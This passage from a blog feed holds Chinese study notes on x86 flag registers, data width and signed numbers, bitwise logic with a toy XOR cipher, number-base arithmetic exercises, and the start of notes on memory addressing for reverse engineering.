Flag)：PF标志位，根据结果中<strong>最低有效字节(最低8位)</strong>中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p><p>解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>辅助进位标志AF(Auxiliary Carry Flag)：<br>如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。<strong>—-（维基百科）</strong></p><p>辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。<strong>—（百度百科）</strong></p><p>解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是<strong>在D0-D7中，D3向D4位进位或者借位，才会置1。</strong>（这个当初老师讲错、百度高赞也是错的，要注意一下）。</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>解析：引一下常用的<code>xor r8/16/32,r8/16/32</code>对寄存器清零操作。</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</p><p>解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把<strong>它换成2进制</strong>确定最高位是0还是1.<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,20</span><br><span class="line">MOV CX,8000</span><br><span class="line">ADD AX,CX</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15704627287517.jpg" alt="-w117" title>                </div>                <div class="image-caption">-w117</div>            </figure><p>这个就是在字上操作，然后相加结果是<code>8020</code>,最高位就是<code>1000</code>，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p><p>解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。</p><p>CF与SF区别：</p><ul><li>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</li><li>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</li></ul><p>溢出主要是给<strong>有符号运算</strong>使用的，在有符号的运算中，有如下的规律：</p><ul><li>正 + 正 = 正 如果结果是负数，则说明有溢出</li><li>负 + 负 = 负 如果结果是正数，则说明有溢出</li><li>正 + 负 永远都不会有溢出.<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15704444932243.jpg" alt="-w315" title>                </div>                <div class="image-caption">-w315</div>            </figure>结合这个图在应为对PF的判断，非常好用。<strong>判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。</strong></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="写汇编指令只影响CF位的值"><a href="#写汇编指令只影响CF位的值" class="headerlink" title="写汇编指令只影响CF位的值"></a>写汇编指令只影响CF位的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0FE</span><br><span class="line">ADD AL,10</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15703705840520.jpg" alt="-w669" title>                </div>                <div class="image-caption">-w669</div>            </figure><h3 id="写汇编指令只影响PF位的值"><a href="#写汇编指令只影响PF位的值" class="headerlink" title="写汇编指令只影响PF位的值"></a>写汇编指令只影响PF位的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,1</span><br><span class="line">ADD AL,2</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15703707829255.jpg" alt="-w630" title>                </div>                <div class="image-caption">-w630</div>            </figure><h3 id="写汇编指令只影响AF位的值"><a href="#写汇编指令只影响AF位的值" class="headerlink" title="写汇编指令只影响AF位的值"></a>写汇编指令只影响AF位的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,0F</span><br><span class="line">ADD EAX,1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15703770643896.jpg" alt="-w588" title>                </div>                <div class="image-caption">-w588</div>            </figure><h3 id="写汇编指令只影响SF位的值"><a href="#写汇编指令只影响SF位的值" class="headerlink" title="写汇编指令只影响SF位的值"></a>写汇编指令只影响SF位的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV CL,0F1</span><br><span class="line">ADD CL,1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/06/标志寄存器/images/15703773573324.jpg" alt="-w716" title>                </div>                <div class="image-caption">-w716</div>            </figure><h3 id="写汇编指令只影响OF位的值"><a href="#写汇编指令只影响OF位的值" class="headerlink" title="写汇编指令只影响OF位的值"></a>写汇编指令只影响OF位的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,80</span><br><span class="line">SUB AL,10</span><br></pre></td></tr></table></figure><p>这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，<strong>站在80的位置顺时针查10，负-正=正</strong>，来实现溢出完成只影响OF位。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot; title=&quot;标志寄存器&quot;&gt;&lt;/a&gt;标志寄存器&lt;/h1&gt;&lt;h2 id=&quot;部分标志寄存器详细介绍&quot;&gt;&lt;a href=&quot;#部分标志寄存器详细介绍&quot; class=&quot;headerlink
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>数据宽度与逻辑运算</title>
    <link href="https://chumen77.github.io/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <id>https://chumen77.github.io/2019/10/01/数据宽度与逻辑运算/</id>
    <published>2019-10-01T13:08:32.000Z</published>
    <updated>2019-10-17T15:47:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据宽度与逻辑运算"><a href="#数据宽度与逻辑运算" class="headerlink" title="数据宽度与逻辑运算"></a>数据宽度与逻辑运算</h1><h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h2><p>数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。</p><h3 id="对数据宽度的理解和有无符号数"><a href="#对数据宽度的理解和有无符号数" class="headerlink" title="对数据宽度的理解和有无符号数"></a>对数据宽度的理解和有无符号数</h3><h4 id="4位宽度表示"><a href="#4位宽度表示" class="headerlink" title="4位宽度表示"></a>4位宽度表示</h4><p>4位宽度表示：假设计算机只能存储4位2进制数：</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr><tr><td align="center"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699374653790.jpg" alt="-w303" title>                </div>                <div class="image-caption">-w303</div>            </figure></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">存无符号数时：<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">存有符号数时：</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">正数：<code>0 1 2 3 4 5 6 7</code></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">负数：<code>-1 -2 -3 -4 -5 -6 -7 -8</code></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">其中对应关系：</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>无符号数时：从0到F逆时针依次增大。</p><p>有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。</p><h5 id="为什么在存有符号数时说开头为1的数就是负数？"><a href="#为什么在存有符号数时说开头为1的数就是负数？" class="headerlink" title="为什么在存有符号数时说开头为1的数就是负数？"></a>为什么在存有符号数时说开头为1的数就是负数？</h5><p>我们只看二进制：</p><p>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| — | — | — | — | — | — | — | — | —  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>举例：对1011的理解</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011在我们当做是有符号时就是-5，无符号就是B。<strong>这个完全看我们如何去定义。</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 8位宽度：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8位宽度表示：假设计算机只能存储8位2进制数。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699387217727.jpg" alt="-w315" title>                </div>                <div class="image-caption">-w315</div>            </figure></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>无符号数：0 1 2 3 4 ……FF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7F<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FF</td><td>FE</td><td>FD</td><td>FC</td><td>FB</td><td>FA</td><td>F9</td><td>F8</td><td>….</td><td>80</td></tr></tbody></table><h4 id="16位宽度"><a href="#16位宽度" class="headerlink" title="16位宽度"></a>16位宽度</h4><p>16位宽度表示：假设计算机只能存储16位2进制数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699389940266.jpg" alt="-w317" title>                </div>                <div class="image-caption">-w317</div>            </figure><p>无符号数：0 1 2 3 4 ……FFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFF</td><td>FFFE</td><td>FFFD</td><td>FFFC</td><td>FFFB</td><td>FFFA</td><td>FFF9</td><td>FFF8</td><td>….</td><td>8000</td></tr></tbody></table><h4 id="32位宽度"><a href="#32位宽度" class="headerlink" title="32位宽度"></a>32位宽度</h4><p>32位宽度表示：假设计算机只能存储32位2进制数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699391219590.jpg" alt="-w378" title>                </div>                <div class="image-caption">-w378</div>            </figure><p>无符号数：0 1 2 3 4 ……FFFFFFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFFFFFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFFFFFF</td><td>FFFFFFFE</td><td>FFFFFFFD</td><td>FFFFFFFC</td><td>FFFFFFFB</td><td>FFFFFFFA</td><td>FFFFFFF9</td><td>FFFFFFF8</td><td>….</td><td>80000000</td></tr><tr><td>### 几个本质问题</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1：计算机除了0和1什么也不认识。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2：如果存的数据超过数据长度限制，超过的会直接抛弃。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>### 几个重要的计量单位：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BYTE  字节  8BIT</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>WORD  字   16BIT 2字节</p><p>DWORD 双字 32BIT 4字节</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><h3 id="二进制的逻辑运算："><a href="#二进制的逻辑运算：" class="headerlink" title="二进制的逻辑运算："></a>二进制的逻辑运算：</h3><h4 id="or："><a href="#or：" class="headerlink" title="or："></a>or：</h4><p>或(or |)  只要有一个为1就是1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699395390213.jpg" alt="-w915" title>                </div>                <div class="image-caption">-w915</div>            </figure><h4 id="and："><a href="#and：" class="headerlink" title="and："></a>and：</h4><p>与(and &amp;)两个都为1才是1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699396122732.jpg" alt="-w871" title>                </div>                <div class="image-caption">-w871</div>            </figure><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>异或（xor) 不一样为1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699397540402.jpg" alt="-w928" title>                </div>                <div class="image-caption">-w928</div>            </figure><p>ps：错位了。。。</p><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>非(not !) 1是0 0是1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15699398562544.jpg" alt="-w255" title>                </div>                <div class="image-caption">-w255</div>            </figure><h3 id="逻辑运算的具体应用："><a href="#逻辑运算的具体应用：" class="headerlink" title="逻辑运算的具体应用："></a>逻辑运算的具体应用：</h3><h4 id="想获取某个值得第N位的值是1还是0"><a href="#想获取某个值得第N位的值是1还是0" class="headerlink" title="想获取某个值得第N位的值是1还是0"></a>想获取某个值得第N位的值是1还是0</h4><p>如：8F<br>        <img src="/2019/10/01/数据宽度与逻辑运算/images/15700250078922.jpg" alt="-w135"><br><strong>方法</strong>：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。</p><h4 id="最简单的加密算法："><a href="#最简单的加密算法：" class="headerlink" title="最简单的加密算法："></a>最简单的加密算法：</h4><p>如：<br>要加密的数据：2015<br>密钥：54<br>因为密钥是两位的，所以要对2015分为<code>20</code>和<code>15</code>。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15701063449646.jpg" alt="-w279" title>                </div>                <div class="image-caption">-w279</div>            </figure><p>进行一次xor运算，出来就是加密后的值：<code>74</code> <code>41</code><br>当用他俩再进行一次xor运算：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/01/数据宽度与逻辑运算/images/15701064241084.jpg" alt="-w253" title>                </div>                <div class="image-caption">-w253</div>            </figure><p>就又变成了2015。这就完成了加密解密。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据宽度与逻辑运算&quot;&gt;&lt;a href=&quot;#数据宽度与逻辑运算&quot; class=&quot;headerlink&quot; title=&quot;数据宽度与逻辑运算&quot;&gt;&lt;/a&gt;数据宽度与逻辑运算&lt;/h1&gt;&lt;h2 id=&quot;数据宽度&quot;&gt;&lt;a href=&quot;#数据宽度&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>进制学习</title>
    <link href="https://chumen77.github.io/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>https://chumen77.github.io/2019/09/28/进制学习/</id>
    <published>2019-09-28T03:52:16.000Z</published>
    <updated>2019-10-17T16:01:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="进制学习"><a href="#进制学习" class="headerlink" title="进制学习"></a>进制学习</h1><h2 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h2><p>十进制的定义:由十个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9</code>逢十进一。</p><p>九进制的定义:由九个符号组成，分别是<code>0 1 2 3 4 5 6 7 8</code>逢九进一。</p><p>十六进制的定义:由十六个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></p><h2 id="进制的本质"><a href="#进制的本质" class="headerlink" title="进制的本质"></a>进制的本质</h2><p>例如十进制：<code>0 1 2 3 4 5 6 7 8 9</code> 其就是由10个<strong>符号</strong>组成。如果定义其为<code>9 1 5 2 4 7 6 3 8 0</code>,或者换成<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15696440221558.jpg" alt="-w315" title>                </div>                <div class="image-caption">-w315</div>            </figure>,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。</p><h2 id="二进制与十六进制的映射关系"><a href="#二进制与十六进制的映射关系" class="headerlink" title="二进制与十六进制的映射关系"></a>二进制与十六进制的映射关系</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15698464290376.jpg" alt="-w911" title>                </div>                <div class="image-caption">-w911</div>            </figure><p>这个需要背会。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="正常认知的进制："><a href="#正常认知的进制：" class="headerlink" title="正常认知的进制："></a>正常认知的进制：</h3><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>从0写到100</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713236407261.jpg" alt="-w900" title>                </div>                <div class="image-caption">-w900</div>            </figure><h4 id="七进制"><a href="#七进制" class="headerlink" title="七进制"></a>七进制</h4><p>编制7进制加法表，乘法表，并计算下面的结果：<strong>23456+54356=？5621-654=？234*65=？</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713237049873.jpg" alt="-w608" title>                </div>                <div class="image-caption">-w608</div>            </figure><p>7进制加法表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713237825325.jpg" alt="-w541" title>                </div>                <div class="image-caption">-w541</div>            </figure><p>7进制乘法表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713238136767.jpg" alt="-w537" title>                </div>                <div class="image-caption">-w537</div>            </figure><p>粗略计算过程：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713245566592.jpg" alt="-w275" title>                </div>                <div class="image-caption">-w275</div>            </figure><p>本质就是直接查表了。</p><h4 id="十六进制："><a href="#十六进制：" class="headerlink" title="十六进制："></a>十六进制：</h4><p>编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713241502952.jpg" alt="-w1387" title>                </div>                <div class="image-caption">-w1387</div>            </figure><p>16进制加法：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713241702367.jpg" alt="-w1337" title>                </div>                <div class="image-caption">-w1337</div>            </figure><p>16进制乘法表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713241834458.jpg" alt="-w1330" title>                </div>                <div class="image-caption">-w1330</div>            </figure><p>粗略计算过程：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15713245906184.jpg" alt="-w238" title>                </div>                <div class="image-caption">-w238</div>            </figure><p>都是查表。</p><h3 id="面向本质的非认知进制："><a href="#面向本质的非认知进制：" class="headerlink" title="面向本质的非认知进制："></a>面向本质的非认知进制：</h3><h4 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h4><p><strong>9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1</strong></p><p><strong>计算：123 + 234 = ?</strong></p><p>先画个进制表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15699252652163.jpg" alt="-w489" title>                </div>                <div class="image-caption">-w489</div>            </figure><p>然后计算：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15699253052200.jpg" alt="-w154" title>                </div>                <div class="image-caption">-w154</div>            </figure><p><strong>解题过程:</strong><br>1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位<br>2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位<br>3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725</p><h4 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h4><p><strong>10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1</strong></p><p>计算：@$$B + %AC&amp; = ? </p><p>先画个进制表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15699343877953.jpg" alt="-w583" title>                </div>                <div class="image-caption">-w583</div>            </figure><p>然后计算：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/28/进制学习/images/15699344047423.jpg" alt="-w185" title>                </div>                <div class="image-caption">-w185</div>            </figure><p><strong>解题过程：</strong><br>1)最后一位<code>B+&amp;</code>中的<code>&amp;</code>是第5个数，所以<code>B+&amp;</code>可以看成从B向后数5个为<code>@%</code>，取最后一个<code>%</code>且有一个进位<br>2)最后第二位<code>$+C</code>中的C是第9个数，所以<code>$+C</code>相当从<code>$</code>开始查9个数，前面有一个进位，需要再向后查一个是<code>@$</code>，取最后一位<code>$</code>且进1位<br>3)最后第三位<code>$+A</code>中的A是第7个数，所以<code>$+A</code>相当于从<code>$</code>开始往后查7个，有一个进位，要再向后查一个，再查一位是<code>@!</code>，所以最后是<code>!</code>且进一位<br>4)第一位的<code>@+%</code>中的@是第一个数，所以<code>@+%</code>相当于从<code>%</code>在往后查一位，因为有个进位所以再往后查一位就是<code>&amp;</code>。所以答案就是<code>&amp;!$%</code>。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>经过这次对进制的学习和练习，对进制理解更加的深刻，<strong>它们只是一堆符号</strong>，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;进制学习&quot;&gt;&lt;a href=&quot;#进制学习&quot; class=&quot;headerlink&quot; title=&quot;进制学习&quot;&gt;&lt;/a&gt;进制学习&lt;/h1&gt;&lt;h2 id=&quot;进制的定义&quot;&gt;&lt;a href=&quot;#进制的定义&quot; class=&quot;headerlink&quot; title=&quot;进制的定义&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>逆向学习-滴水公开课</title>
    <link href="https://chumen77.github.io/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    <id>https://chumen77.github.io/2019/09/27/逆向学习-滴水公开课/</id>
    <published>2019-09-27T15:14:39.000Z</published>
    <updated>2019-10-17T15:45:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向学习-滴水公开课知识总结"><a href="#逆向学习-滴水公开课知识总结" class="headerlink" title="逆向学习-滴水公开课知识总结"></a>逆向学习-滴水公开课知识总结</h1><h3 id="一、内存的读写"><a href="#一、内存的读写" class="headerlink" title="一、内存的读写"></a>一、内存的读写</h3><h4 id="寻址公式一-立即数"><a href="#寻址公式一-立即数" class="headerlink" title="寻址公式一: [立即数]"></a>寻址公式一: [立即数]</h4><p>读取内存的值:<br>    <code>MOV EAX,DWORD PTR DS:[0x13FFC4]    MOV EAX,DYVORD PTR DS:[0x13FFC8]</code><br>    向内存中写入数据:<br>    <code>MOV DWORD PTR DS:[0x13FFC4],eax    MOV DWORD PTR DS:[0x13FFC8].ebx</code><br>    获取内存编号:<br>  <code>LEA EAX,DWORD PTR DS:[0X13FFC4]    LEA EAX,DWORD PTR DS:[ESP+8]</code></p><h4 id="寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个"><a href="#寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个" class="headerlink" title="寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个"></a>寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX]MOV EAX,DWORD PTR DS:[EDX]</code></p><h4 id="寻址公式三-reg-立即数"><a href="#寻址公式三-reg-立即数" class="headerlink" title="寻址公式三: [reg+立即数]"></a>寻址公式三: [reg+立即数]</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX+4]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD 